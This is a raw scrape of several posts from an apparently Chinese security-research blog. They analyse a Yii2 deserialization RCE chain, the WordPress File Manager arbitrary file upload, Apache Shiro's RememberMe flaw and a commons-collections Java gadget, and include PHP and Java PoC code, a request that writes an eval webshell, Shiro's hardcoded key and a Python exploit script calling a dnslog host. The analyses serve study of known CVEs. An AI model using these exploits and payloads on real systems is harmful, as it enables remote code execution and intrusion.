if (is_dir($this-&gt;path.'/'.$nsKey)) { rmdir($this-&gt;path.'/'.$nsKey); } unset($this-&gt;keys[$nsKey]); }} 因为 $nsKey $this-&gt;keys 可控，跟进$this-&gt;clearKey(· \\Swift_KeyCache_DiskKeyCache::clearKey 1234567public function clearKey($nsKey, $itemKey){ if ($this-&gt;hasKey($nsKey, $itemKey)) { $this-&gt;freeHandle($nsKey, $itemKey); unlink($this-&gt;path.'/'.$nsKey.'/'.$itemKey); }} \\Swift_KeyCache_DiskKeyCache::hasKey 1234public function hasKey($nsKey, $itemKey){ return is_file($this-&gt;path.'/'.$nsKey.'/'.$itemKey);} $this-&gt;path 可控 ，进行了字符串的拼接操作，可以利用魔术方法 __toString 触发后续操作。 __toString() 方法用于一个类被当成字符串时应怎样回应。 然后全局搜索 __toString 方法 \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString 1234public function __toString() : string{ return $this-&gt;refers . ($this-&gt;description ? ' ' . $this-&gt;description-&gt;render() : '');} $this-&gt;description 可控，则又可以利用魔术方法 __call()。 利用链 \\Swift_KeyCache_DiskKeyCache::__destruct() \\Swift_KeyCache_DiskKeyCache::clearAll() \\Swift_KeyCache_DiskKeyCache::clearKey() \\Swift_KeyCache_DiskKeyCache::hasKey() \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString() \\Faker\\Generator::__call() \\Faker\\Generator::format(‘render’,[]) \\call_user_func_array([‘new yii\\rest\\CreateAction’,‘run’],[]) \\yii\\rest\\CreateAction::run() \\call_user_func(‘system’,‘whoami’) POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace { use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache { private $keys = []; private $path; public function __construct() { $this-&gt;path = new See; $this-&gt;keys = array( \"test\"=&gt;array(\"test\") ); } }}namespace{ echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}?&gt; 利用链5 \\Symfony\\Component\\String\\UnicodeString::__wakeup 1234public function __wakeup(){ normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);} __wakeup 方法中 调用了 normalizer_is_normalized 方法 normalizer_is_normalized 方法 会把参数当作字符串进行处理 ，并且$this-&gt;string 可控。只需要寻找魔术方法 __toString 触发后续操作。 normalizer_is_normalized 检查提供的字符串是否已经处于指定的规范化形式 利用链 \\Symfony\\Component\\String\\UnicodeString::__wakeup normalizer_is_normalized() \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString() \\Faker\\Generator::__call() \\Faker\\Generator::format(‘render’,[]) \\call_user_func_array([‘new yii\\rest\\CreateAction’,‘run’],[]) \\yii\\rest\\CreateAction::run() \\call_user_func(‘system’,‘whoami’) POC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace Symfony\\Component\\String{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class UnicodeString { private $string; public function __construct() { $this-&gt;string = new See; } }}namespace{ echo base64_encode(serialize(new Symfony\\Component\\String\\UnicodeString()));}?&gt; 在执行 system(\"whoami\") 的命令时，会报错 yii 视图报错导致无法回显命令执行的结果，执行其他命令即可。 可能还会遇到大佬说的这个问题 PREG_UNMATCHED_AS_NULL ，REG_UNMATCHED_AS_NULL 这个静态变量存在于 php7.2 版本以上，更换 php 版本就可以解决这个问题。 我选择 php7.3.4 时利用成功，选择 php7.0.9 虽没利用成功，但没有详细的报错信息。 参考文章 CVE-2020-15148 Yii2反序列化RCE POP链分析 我是怎么挖掘yii2反序列化0day的 yii2反序列化后续 怎样挖掘出属于自己的php反序列化链 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Wordpress file manager插件命令执行","slug":"Wordpress file manager插件命令执行","date":"2020-09-10T02:50:32.000Z","updated":"2021-03-09T15:57:27.163Z","comments":true,"path":"2020/09/10/Wordpress file manager插件命令执行/","link":"","permalink":"http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"ps: 首发在云众可信的sec-in平台：sec-in.com 环境搭建 利用 phpstudy 搭建 wordpress ，http://wordpress.test/wp-admin/plugin-install.php 将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本","text":"ps: 首发在云众可信的sec-in平台：sec-in.com 环境搭建 利用 phpstudy 搭建 wordpress ，http://wordpress.test/wp-admin/plugin-install.php 将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本 漏洞利用 这段代码来自 elFinder 项目，这是一个向 Web 应用程序提供文件浏览器 GUI 的框架。这个非常具体的代码仅作为示例，而不能在生产应用程序中直接使用。但是，正如我们所看到的，使用了它，结果是可以执行这部分代码而无需进行身份验证。 在 exp-db 搜索 elFinder 下载下来的漏洞利用文件需要修改部分 漏洞分析 发送一个这样的 payload 来进行创建文件的操作 http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw 漏洞触发位置 /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 通过创建 elFinderConnector 对象，进而调用 elFinderConnector.run 读取所有的请求参数保存到 $src 中， $cmd 获取 cmd 变量。 \\elFinderConnector::run 接着执行到循环 foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) { 对 $cmd 进行校验 跟进函数commandArgsList \\elFinder::commandArgsList \\elFinder::commandExists 通过判断 $cmd ，在 $this-&gt;commands[$cmd] 中发现了可以调用的方法 \\elFinder::$commands 继续执行，发现 $this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args)); \\elFinder::exec 控制 $cmd = makedile 时, 为满足条件继续向下执行，需要传入 $target 或者 $dst。 $this-&gt;volume($dst) 根据传入的 $dst 前缀进行选择 l1_ 或者 t1_ 我们在后面进行调试时会发现生成文件的位置前缀为所对应的 root 的值 ，所以我们在这里选择 l1_ \\elFinder::volume 继续执行到动态调用，通过 $result = $this-&gt;$cmd($args); 调用makefile方法。 \\elFinderVolumeDriver::mkfile $path = $this-&gt;decode($dst); \\elFinderVolumeDriver::decode decode 函数 先将$hash 的值根据 $this-&gt;id 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 $this-&gt;root 返回$path = E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files 继续回到 mkfile 函数中执行 \\elFinderVolumeLocalFileSystem::_mkfile 最后顺利生成文件在 E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php 对于网站的位置就是 \\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php 然后再调用 PUT 方法，传值到 mkfile 生成的文件内。 http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=put&amp;target=l1_dGVzdC5waHA=&amp;content=&lt;?php eval($_GET['cmd']);?&gt; 前一部分不在详述，直接跟到 $result = $this-&gt;$cmd($args); 调用 put 方法 \\elFinder::put \\elFinderVolumeDriver::putContents \\elFinderVolumeDriver::decode decode 函数 先将$hash 的值根据 $this-&gt;id 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 $this-&gt;root 最后会返回 $path 的值为E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php \\elFinderVolumeLocalFileSystem::_filePutContents 成功将字符串写入文件中 成功利用还可以直接利用 upload 方法，上传文件 \\elFinder::upload 参考文章 Wordpress file manager插件任意文件上传 WordPress文件管理器插件0day漏洞解析 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4反序列化漏洞","slug":"Apache Shiro 1.2.4反序列化漏洞","date":"2020-08-31T06:37:52.000Z","updated":"2021-03-09T15:57:27.157Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4反序列化漏洞/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。","text":"漏洞简介 Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为 RememberMe 的 Cookie 中。攻击者可以使用 Shiro 的默认密钥伪造用户 Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 SHIRO-550 在识别身份的时候，需要对 Cookie 里的 RememberMe 字段解密,解密的顺序为： 检索cookie中RememberMe的值 Base64解码 使用AES解密 反序列化 但是，AES 加密的秘钥被硬编码在代码里，每个人通过源代码都可以拿到 AES 加密的密钥。所以当攻击者将恶意的 payload 进行序列化、AES 加密、base64 编码，作为 Cookie 的 RememberMe 字段发送。Shiro 将 RememberMe 进行解密并且反序列化，最终造成反序列化漏洞。 漏洞分析 获取 Apache Shiro 存在漏洞的源代码 123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 修改 /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 然后用idea导入mvn项目 设置run/debug configurations， 添加本地tomcat环境 在 org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin 处添加断点，然后debug 开启 tomcat 服务 加密过程 登录账户root/secret，勾选上Remember Me的按钮，程序会停在断点处，用户名和密码也会存储在 token 中 forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法 org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) 调用 forgetIdentity 构造方法处理 request 和 reponse 请求 org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) 跟进 removeFrom 方法，在 response 响应头中加入了一些cookie信息。 org.apache.shiro.web.servlet.SimpleCookie#removeFrom 回到 onSuccessfulLogin 调用 rememberIdentity 生成 cookie 中的 remember 字段。跟进 rememberIdentity 方法。 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) 通过 getIdentityToRemember 获取用户的身份，继续跟进 rememberIdentity 方法。 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) 调用 convertPrincipalsToBytes 方法将 accountPrincipals &lt;“root”&gt; 转换为字节形式，跟进 convertPrincipalsToBytes 方法。 org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes 转换过程中首先对用户的 id 进行序列化，然后利用 encrypt 进行加密。 org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 加密的密钥由getEncryptionCipherKey()得到 getEncryptionCipherKey 实际上是开头中的 DEFAULT_CIPHER_KEY_BYTES 的常量 kPH+bIxk5D2deZiIxcaaaA== 密钥分析 org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey 继续单步执行，返回 rememberIdentity 函数 跟进函数 rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity 对值进行 base64 编码之后，设置到 cookie 中。 当我们勾选 RememberMe 选项框之后，点击登陆之后，后端会进行如下操作。 序列化用户 id 对用户 id 进行 AES 加密，密钥为常量 base64 编码 设置到 cookie 中的 rememberme 字段 解密过程 在 org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 添加断点，然后发送一个带有 readmemberMe cookie的请求。 跟进函数 getRememberedPrincipals org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 调用 getRememberedSerializedIdentity 针对http请求进行处理，跟进 getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值 然后调用 byte[] decoded = Base64.decode(base64)处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码 回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES 解密 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt 反序列化 org.apache.shiro.mgt.AbstractRememberMeManager#deserialize org.apache.shiro.io.DefaultSerializer#deserialize 看到 readObject() 当我们发送带有 readmemberMe cookie的请求，后端会进行如下操作。 读取 cookie 中 rememberMe 的值 base64 解码 进行 AES 解密，密钥为常量 反序列化 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# 创建 rememberme的值popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() 漏洞利用 commons-collections 3.2.1 shiro自带的commons-collections-3.2.1 、commons-beanutils-1.8.3 在JDK1.8u112中，可以直接利用 ysoserial 中的Commons-Collections5（3.1-3.2.1，jdk1.8） 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" 会报错提示 org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. 回到 org.apache.shiro.io.DefaultSerializer#deserialize 我们发现在这里使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream 的 resolveClass 函数用的是Class.forName 类获取当前描述器所指代的类的Class对象 shiro 中 ClassResolvingObjectInputStream 继承了 ObjectInputStream，resolveClass 被重写，调用了 ClassUtils.forName 获取当前描述器所指代的类的Class对象 org.apache.shiro.util.ClassUtils#forName 看一下 ExceptionIgnoringAccessor 是如何是实现的 org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 参考文章 Apache Shiro Java反序列化漏洞分析 Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437) Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"相关函数总结","slug":"相关函数总结","date":"2020-08-20T13:31:50.000Z","updated":"2021-03-09T15:57:27.164Z","comments":true,"path":"2020/08/20/相关函数总结/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP 相关函数","text":"PHP 相关函数 审计利用函数 var_dump() var_dump() 函数用于输出变量的相关信息。 任意文件下载 fread() fread() 函数读取文件（可安全用于二进制文件） fread(file,length) 参数 描述 file 必需。规定要读取打开文件。 length 必需。规定要读取的最大字节数。 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); 变量覆盖 extrat() extract() 从数组中将变量导入到当前的符号表 命令执行 call_user_func_array() call_user_func_array(“system”,[“whoami”]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstorm进行PHP断点调试","slug":"phpstorm进行PHP断点调试","date":"2020-08-20T07:19:41.000Z","updated":"2021-03-09T15:57:27.161Z","comments":true,"path":"2020/08/20/phpstorm进行PHP断点调试/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"配置环境 phpstrom phpstudy","text":"配置环境 phpstrom phpstudy phpstrom 配置 php 环境 PHP安装xdebug扩展 注意版本：此时我们 php 的版本为 php5.6.9 xdebug模块 https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll 把下载成功的 php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll 放在 E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext 文件夹下 同时在 php.ini 中添加如下配置 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;指定Xdebug扩展文件的绝对路径xdebug.auto_trace=on ;启用代码自动跟踪xdebug.collect_params=on ;允许收集传递给函数的参数变量xdebug.collect_return=on ;允许收集函数调用的返回值xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定堆栈跟踪文件的存放目录xdebug.profiler_enable=on ;是否启用Xdebug的性能分析，并创建性能信息文件xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;指定性能分析信息文件的输出目录xdebug.remote_enable = on ;是否开启远程调试xdebug.remote_handler = dbgp ;指定远程调试的处理协议xdebug.remote_host= localhost ;指定远程调试的主机名xdebug.remote_port = 9000 ;指定远程调试的端口号xdebug.idekey = PHPSTORM ;指定传递给DBGp调试器处理程序的IDE Key PHPStrom 配置 debug 环境 配置 Debug 端口 配置IDEKEY 配置Server 配置PHP Web Application 浏览器的xdebug插件 测试调试 加上断点，同时把小电话设置成为绿色的 浏览器上的插件打开，同时访问要调试的页面 调试单个文件 调试单个文件时 配置PHP Web Application 点击绿色的小虫子就可以进行调试了 就可以进行愉快的调式了！ 在进行调试时，经常遇到这个问题,xdebug断掉调试经常无故断开 如果针对某一个项目可以对项目的配置文件 vhosts.conf 中添加 12IPCConnectTimeout 3000IPCCommTimeout 3000 要对所有项目都进行配置时，可以修改httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"初识Java 反序列化","slug":"初识Java反序列化","date":"2020-08-16T13:31:50.000Z","updated":"2021-03-09T15:57:27.163Z","comments":true,"path":"2020/08/16/初识Java反序列化/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。","text":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。 Why 为什么要用序列化与反序列化 实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上。 利用序列化实现远程通信，即在网络上传送对象的字节序列。 How 如何实现序列化与反序列化 JDK类库中序列化API 使用到JDK中关键类 ObjectOutputStream(对象输出流) 和ObjectInputStream(对象输入流) ObjectOutputStream 类中：通过使用 writeObject(Object object) 方法，将对象以二进制格式进行写入。 ObjectInputStream 类中：通过使用 readObject（）方法，从输入流中读取二进制流，转换成对象。 序列化一个对象 被序列化的类必须要实现 Serializable 接口，否则将无法序列化对象。 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} 序列化对象时使用对象输出流\"ObjectOutputStream\"，往指定输出流里写入 User 对象，使用控制台，可以直观的看到对象序列化后的样子。 �� \u0005sr Simple.User��Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet 反序列化对象 将对象序列化成byte数组。再用\"ObjectInputStream\"反序列化回来。 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //将byte数组输入流反序列化 System.out.println(o); }} 输出这个反序列化后的对象，和一开始为 User 对象设定的属性值完全相同。 同时Java为我们提供了自定义writeObject()、readObject()方法的功能，我们在目标类中自定义writeObject()、readObject()方法之后，将会首先调用我们自定义的方法，然后在继续执行原有的方法步骤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User 类写一个 readObject 方法上去，当对象被反序列化的时候，该方法就会被调用。 序列化时仅能序列化对象的属性，并不能控制方法中的reObject的代码，所有漏洞的构造需要引入新的jar包 commons-collections-3.1反序列化漏洞 漏洞利用 利用maven 安装依赖 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} 漏洞分析 java.lang.Runtime#exec(java.lang.String) 在exec处添加断点 查看调用链 最终遍历了\"outerMap\"这个Map对象的 Entry 集合，然后执行了 Entry 对象的的 setValue 方法导致执行了反射链。 所以先查看 outerMap 的实现类 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 调用了方法org.apache.commons.collections.map.TransformedMap#decorate 这个静态方法又去new了一个TransformedMap对象。map传入的是一个普通的数据，valueTransformer则是构造的调用链。 org.apache.commons.collections.map.TransformedMap#TransformedMap 实例化对象成功后依次调用了四个方法 entrySet() iterator() next() setValue() 在类 TransformedMap中未找到定义的 entrySet()方法，在他的父类AbstractInputCheckedMapDecorator 中找 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySet new 了一个内部类 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet EntrySet类中的iterator方法 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator 又new了一个内部类 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator EntrySetIterator类中的next方法 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#next 又new了一个内部类 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry MapEntry类中的setValue方法 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue 第一行调用了checkSetValue方法，此处的parent来自 所以实际上调用为 org.apache.commons.collections.map.TransformedMap#checkSetValue 调用了valueTransformer 的transform方法 所以首先调用了org.apache.commons.collections.functors.ChainedTransformer#transform 循环调用数组每一个对象的transform方法，并传入object对象，再将执行结果赋值给object对象 [0]是ConstantTransformer对象，它会返回new时候的参数中的Object对象，这里也是就是\"java.Runtime\" [1]-[3]是InvokerTransformer对象，调用的是反射的代码 iTransformers的值是在初始化构建ChainedTransformer时生成 org.apache.commons.collections.functors.ChainedTransformer#ChainedTransformer ConstantTransformer类中实现transform方法 org.apache.commons.collections.functors.ConstantTransformer#transform InvokerTransformer类中实现了transform方法 org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (“getMethod”, new Class[] {String.class, Class[].class }, new Object[] {“getRuntime”, new Class[0] }) iMethodName = “getMethod”; iParamTypes = new Class[] {String.class, Class[].class } ; iArgs = new Object[] {“getRuntime”, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} 第一个参数\"getMethod\"是这个函数的名字 第二个参数new Class[]{String.class, 